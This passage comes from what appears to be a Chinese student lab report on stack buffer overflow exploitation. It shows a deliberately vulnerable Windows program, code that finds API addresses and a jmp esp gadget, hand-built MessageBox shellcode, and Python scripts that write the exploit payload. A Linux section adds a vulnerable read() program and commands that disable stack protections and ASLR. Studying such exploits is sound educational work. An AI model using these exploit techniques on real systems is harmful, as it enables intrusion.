class="line"></span><br><span class="line">    // 尝试以 <span class="string">&quot;rw+&quot;</span> 模式打开 <span class="string">&quot;password2.txt&quot;</span> 文件</span><br><span class="line">    // <span class="string">&quot;rw+&quot;</span> 模式用于读写文件，如果文件不存在，程序将退出</span><br><span class="line">    <span class="keyword">if</span> (!(fp = fopen(<span class="string">&quot;password2.txt&quot;</span>, <span class="string">&quot;rw+&quot;</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">        exit(<span class="number">0</span>);               // 如果文件打开失败，则退出程序</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 从文件中读取一个字符串，并将其存储在 password 数组中</span><br><span class="line">    // 假设文件内容为用户输入的密码</span><br><span class="line">    fscanf(fp, <span class="string">&quot;%s&quot;</span>, password);</span><br><span class="line"></span><br><span class="line">    // 调用 verify_password 函数检查密码是否正确</span><br><span class="line">    valid_flag = verify_password(password);</span><br><span class="line"></span><br><span class="line">    // 判断 valid_flag 的值，以确定密码是否正确</span><br><span class="line">    <span class="keyword">if</span> (valid_flag)            // 如果 valid_flag 非零，表示密码不正确</span><br><span class="line">    &#123;</span><br><span class="line">        printf(<span class="string">&quot;incorrect password!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>                        // 如果 valid_flag 为零，表示密码正确</span><br><span class="line">    &#123;</span><br><span class="line">        printf(<span class="string">&quot;Congratulation! You have passed the verification!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 关闭文件</span><br><span class="line">    fclose(fp);</span><br><span class="line"></span><br><span class="line">    // 等待用户输入以暂停程序</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>); // Windows 系统下暂停程序并显示 <span class="string">&quot;Press any key to continue...&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  // 返回 <span class="number">0</span>，表示程序正常结束</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>获取 API 函数地址</strong>：<br>可以使用<code>GetProcAddress</code>获取<code>MessageBoxA</code>和<code>ExitProcess</code>的地址。例如：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*MYPROC)</span><span class="params">(LPTSTR)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    HINSTANCE LibHandle;     <span class="comment">// 定义库句柄</span></span><br><span class="line">    MYPROC ProcAdd;          <span class="comment">// 定义函数指针</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载 user32.dll 库</span></span><br><span class="line">    LibHandle = LoadLibrary(<span class="string">&quot;user32&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (LibHandle == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to load user32.dll\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印 user32.dll 的加载地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;user32 = 0x%p\n&quot;</span>, LibHandle);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取 MessageBoxA 函数的地址</span></span><br><span class="line">    ProcAdd = (MYPROC)GetProcAddress(LibHandle, <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (ProcAdd == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to get address of MessageBoxA\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;MessageBoxA = 0x%p\n&quot;</span>, ProcAdd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取 ExitProcess 函数的地址</span></span><br><span class="line">    ProcAdd = (MYPROC)GetProcAddress(LibHandle, <span class="string">&quot;ExitProcess&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (ProcAdd == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to get address of ExitProcess\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ExitProcess = 0x%p\n&quot;</span>, ProcAdd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    getchar();  <span class="comment">// 暂停程序，等待用户输入</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user32 = 0x77650000</span><br><span class="line">MessageBoxA = 0x776DBDE0</span><br><span class="line">ExitProcess = 0x772CA200</span><br></pre></td></tr></table></figure>
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241115013912519.png" class="" title="image-20241115013912519">
<p><strong>选取跳板（<code>jmp esp</code>）</strong></p>
<p>为了让程序跳转到栈的顶部执行Shellcode，我们需要找到一个<code>jmp esp</code>指令的地址。可以在常驻内存的DLL（如<code>user32.dll</code>）中查找固定的<code>jmp esp</code>指令，以确保该地址的稳定性。</p>
<p>查找<code>jmp esp</code>机器码</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(student㉿kali)-[~]</span><br><span class="line">└─$ msf-nasm_shell</span><br><span class="line">nasm &gt; jmp esp</span><br><span class="line">00000000  FFE4              jmp esp</span><br><span class="line">nasm &gt; <span class="built_in">exit</span></span><br><span class="line">                                                                                                         </span><br><span class="line">┌──(student㉿kali)-[~]</span><br><span class="line">└─$ </span><br></pre></td></tr></table></figure>
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241115020740047.png" class="" title="image-20241115020740047">
<p><strong>查找<code>jmp esp</code>的代码</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    BYTE *ptr;               <span class="comment">// 指向 DLL 的指针</span></span><br><span class="line">    <span class="type">int</span> position;            <span class="comment">// 当前扫描的位置</span></span><br><span class="line">    HINSTANCE handle;        <span class="comment">// DLL 的句柄</span></span><br><span class="line">    BOOL done_flag = FALSE;  <span class="comment">// 标志是否找到指令</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载 user32.dll</span></span><br><span class="line">    handle = LoadLibrary(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!handle) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;load dll error!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ptr = (BYTE *)handle;  <span class="comment">// 将句柄转换为 BYTE 指针，指向 DLL 的基址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历 DLL 的内存，寻找 jmp esp 指令（0xFF 0xE4）</span></span><br><span class="line">    <span class="keyword">for</span> (position = <span class="number">0</span>; !done_flag; position++) &#123;</span><br><span class="line">        <span class="comment">// 检查当前字节和下一个字节是否为 0xFF 和 0xE4</span></span><br><span class="line">        <span class="keyword">if</span> (ptr[position] == <span class="number">0xFF</span> &amp;&amp; ptr[position + <span class="number">1</span>] == <span class="number">0xE4</span>) &#123;</span><br><span class="line">            <span class="type">int</span> address = (<span class="type">int</span>)(ptr + position);  <span class="comment">// 计算找到的指令的地址</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;OPCODE found at 0x%x\n&quot;</span>, address);</span><br><span class="line">            done_flag = TRUE;  <span class="comment">// 设置标志，表示已经找到指令</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> address = (<span class="type">int</span>)(ptr + position);  <span class="comment">// DLL 扫描结束的位置</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;END OF 0x%x\n&quot;</span>, address);     <span class="comment">// 打印扫描结束位置</span></span><br><span class="line"></span><br><span class="line">    getchar();  <span class="comment">// 暂停程序，等待用户按键</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">OPCODE found at 0x7766da3f</span><br><span class="line">END OF 0x7766da40</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--------------------------------</span><br><span class="line">Process exited after 16.86 seconds with <span class="built_in">return</span> value 0</span><br><span class="line">请按任意键继续. . .</span><br></pre></td></tr></table></figure>
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241115015330779.png" class="" title="image-20241115015330779">
<p>运行此代码可以找到<code>user32.dll</code>中包含<code>jmp esp</code>的地址，例如<code>0x7766da3f</code>。</p>
<p><strong>构造攻击输入数据</strong></p>
<p>在本实验中，攻击输入的数据格式为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;AAAAAAAAAAAAXXXXSSSS......SSSS&quot;</span><br></pre></td></tr></table></figure>
<p>其中：</p>
<ul>
<li><strong><code>AAAAAAAAAAA</code></strong>：用于填充缓冲区</li>
<li><strong><code>XXXX</code></strong>：覆盖返回地址，这里使用<code>jmp esp</code>地址，例如<code>0x7766da3f</code></li>
<li><strong><code>SSSS</code></strong>：Shellcode，用于执行攻击代码</li>
</ul>
<p><strong>编写Shellcode</strong></p>
<p>为了展示缓冲区溢出攻击效果，我们构造一个简单的Shellcode，调用Windows API的<code>MessageBox</code>显示一个弹框。</p>
<p>编写shellcode 找到了地址之后就可以构造 shellcode 了</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>机器码</th>
<th>汇编指令</th>
<th>注释</th>
</tr>
</thead>
<tbody>
<tr>
<td>33DB</td>
<td>XOR EBX,EBX</td>
<td>异或置零</td>
</tr>
<tr>
<td>53</td>
<td>PUSH EBX</td>
<td>作为字符串结束的截断符号 0</td>
</tr>
<tr>
<td>684841434B</td>
<td>PUSH 4B434148</td>
<td>把 ‘HACK’ 字符串进栈</td>
</tr>
<tr>
<td>8BC4</td>
<td>MOV EAX,ESP</td>
<td>字符串指针，方便后面 push 进去</td>
</tr>
<tr>
<td>53</td>
<td>PUSH EBX</td>
<td>第四个参数 0</td>
</tr>
<tr>
<td>50</td>
<td>PUSH EAX</td>
<td>第三个参数 标题</td>
</tr>
<tr>
<td>50</td>
<td>PUSH EAX</td>
<td>第二个参数 内容</td>
</tr>
<tr>
<td>53</td>
<td>PUSH EBX</td>
<td>第一个参数 0</td>
</tr>
<tr>
<td>B8E0BD6D77</td>
<td>MOV EAX, 776DBDE0</td>
<td>把 Messagebox 的函数地址放到 EAX (MessageBoxA = 0x776DBDE0)</td>
</tr>
<tr>
<td>FFD0</td>
<td>CALL EAX</td>
<td>调用 Messagebox</td>
</tr>
</tbody>
</table>
</div>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">33DB53684841434B8BC453505053B8E0BD6D77FFD0</span><br></pre></td></tr></table></figure>
<p>返回地址<code>(0x7766da3f)</code>后面跟着 shellcode 就行了，我们还希望他能够正常的退出，给它加上一个 ExitProcess <code>(0x772CA200)</code>函数</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>机器码</th>
<th>汇编</th>
<th>注释</th>
</tr>
</thead>
<tbody>
<tr>
<td>53</td>
<td>PUSH BEX</td>
<td>exit(0)，这个是参数 0</td>
</tr>
<tr>
<td>B800A22C77</td>
<td>MOV EAX,0x772CA200</td>
<td>地址放到 eax</td>
</tr>
<tr>
<td>FFD0</td>
<td>CALL EAX</td>
<td>调用函数</td>
</tr>
</tbody>
</table>
</div>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">53B800A22C77FFD0 </span><br></pre></td></tr></table></figure>
<p>完整payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">33DB53684841434B8BC453505053B8E0BD6D77FFD053B800A22C77FFD0 </span><br></pre></td></tr></table></figure>
<p>计算缓冲区大小</p>
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241115030058579.png" class="" title="image-20241115030058579">
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241115030045328.png" class="" title="image-20241115030045328">
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241115030144359.png" class="" title="image-20241115030144359">
<p>报错EIP为<code>41306341</code></p>
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241115030257989.png" class="" title="image-20241115030257989">
<p>得知缓冲区大小为60字节</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义攻击输入数据的各个部分</span></span><br><span class="line">buffer_fill = <span class="string">b&quot;\x90&quot;</span> * <span class="number">60</span>  <span class="comment"># 用 0x90 (NOP 指令) 填充到 60 字节</span></span><br><span class="line">jmp_esp_address = <span class="string">b&quot;\x3f\xda\x66\x77&quot;</span>  <span class="comment"># jmp esp 地址，0x7766da3f，小端格式</span></span><br><span class="line">shellcode = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;33DB53684841434B8BC453505053B8E0BD6D77FFD053B800A22C77FFD0&quot;</span>)  <span class="comment"># Shellcode，转为字节</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 组合最终的攻击输入数据</span></span><br><span class="line">exploit_payload = buffer_fill + jmp_esp_address + shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 exploit_payload 写入 password2.txt 文件，使用二进制写入模式</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password2.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(exploit_payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Exploit payload written to password2.txt successfully.&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090903FDA667733DB53684841434B8BC453505053B8E0BD6D77FFD053B800A22C77FFD0</span><br></pre></td></tr></table></figure>
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241115031623326.png" class="" title="image-20241115031623326">
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241115032005580.png" class="" title="image-20241115032005580">
<p>成功！</p>
<p>另一种写法：</p>
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/1563440952257-b48cee01-646b-42bf-b8a8-c1d695ba65ea.webp" class="" title="img">
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241115042611956.png" class="" title="image-20241115042611956">
<p>可以用全部填充容易辨认的字符找寻缓冲区起始地址(这种找到的地址执行不了，不知道为什么)</p>
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241115033649693.png" class="" title="image-20241115033649693">
<p>正解：通过如下代码就可调整 Shellcode 和栈指针位置（加入调整代码）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义攻击输入数据的各个部分</span></span><br><span class="line">payload = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;33DB53684841434B8BC453505053B8E0BD6D77FFD053B800A22C77FFD0&quot;</span>)  <span class="comment"># Shellcode，转为字节</span></span><br><span class="line">padding = <span class="string">b&quot;\x90&quot;</span> * (<span class="number">60</span> - <span class="built_in">len</span>(payload))  <span class="comment"># 用 0x90 (NOP 指令) 填充到 60 字节</span></span><br><span class="line">return_address = <span class="string">b&quot;\x3f\xda\x66\x77&quot;</span>  <span class="comment"># jmp esp 地址，0x7766da3f，小端格式</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 adjust_code，包含 `jmp esp` 和 `add esp, -64`</span></span><br><span class="line"><span class="comment"># jmp esp: 0xFFE4</span></span><br><span class="line"><span class="comment"># add esp, -64: 0x83EC40</span></span><br><span class="line">adjust_code = <span class="string">b&quot;\xFF\xE4&quot;</span> + <span class="string">b&quot;\x83\xEC\x40&quot;</span>  <span class="comment"># `jmp esp` + `add esp, -64`</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 组合最终的攻击输入数据</span></span><br><span class="line">final_payload = payload + padding + return_address + adjust_code</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 final_payload 写入 password2.txt 文件，使用二进制写入模式</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password2.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(final_payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Exploit payload written to password2.txt successfully.&quot;</span>)</span><br></pre></td></tr></table></figure>
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241115042159341.png" class="" title="image-20241115042159341">
<p><code>add esp, -64</code> 的机器码是 <code>0x83 EC 40</code>。下面是对该机器码的解读。</p>
<ul>
<li><strong><code>0x83</code></strong>：这是 <code>add</code> 指令的操作码（opcode），并且表明操作数是立即数（<code>imm8</code>，8位立即数）和寄存器（在这里是 <code>esp</code>）。</li>
<li><strong><code>EC</code></strong>：这是 <code>modrm</code> 字节，用于指定操作的寄存器和操作数类型。在此情况下，<code>EC</code> 表示目标寄存器为 <code>esp</code>。</li>
<li><strong><code>40</code></strong>：这是立即数 <code>-64</code> 的值。因为立即数 <code>40</code> 是无符号的，我们可以理解为<strong>有符号的8位补码</strong>。<code>0x40</code> 的补码为 <code>-64</code>。</li>
<li><code>64</code>是因为缓冲空间（<code>60</code>）加上EIP（<code>4</code>）的大小</li>
</ul>
<p><strong>实验结果</strong></p>
<p>成功运行后，程序将会调用<code>MessageBoxA</code>函数，弹出包含<code>&quot;HACK&quot;</code>消息的对话框，随后调用<code>ExitProcess</code>函数退出程序。</p>
<h4 id="（二）Linux-栈溢出示例"><a href="#（二）Linux-栈溢出示例" class="headerlink" title="（二）Linux 栈溢出示例"></a><strong>（二）Linux 栈溢出示例</strong></h4><p><strong>软件保护机制：</strong></p>
<p>CANARY(栈保护)</p>
<p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p>
<p>NX（DEP）(数据执行保护 Data Execution Prevention)</p>
<p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p>
<p>PIE（ASLR）</p>
<p>内存地址随机化机制（address space layout randomization)，有以下三种情况：<br>0 - 表示关闭进程地址空间随机化<br>1 - 表示将mmap的基址，stack和vdso页面随机化<br>2 - 表示在1的基础上增加堆（heap）的随机化</p>
<p>入手，什么保护都没的 源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    vulnerable_function();</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241115175044608.png" class="" title="image-20241115175044608">
<p>使用以下命令进行编译：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -z execstack -no-pie -o level1 level1.c</span><br><span class="line"><span class="built_in">echo</span> 0 | sudo <span class="built_in">tee</span> /proc/sys/kernel/randomize_va_space //关闭ASLR（地址空间布局随机化）</span><br></pre></td></tr></table></figure>
<p>-m32意思是编译为32位的程序<br>-fno-stack-protector和-z execstack这两个参数会分别关掉DEP和Stack Protector</p>
<p>在 root 权限下执行（为了方便下面的步骤最好一直在root下）：<br><code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code><br>这样就关掉了整个系统的ASLR</p>
<p>使用<code>checksec</code>命令来检查一下保护机制：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec --file=./level1</span><br></pre></td></tr></table></figure>
<img src="/2024/11/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B/image-20241115175857826.png" class="" title="image-20241115175857826">
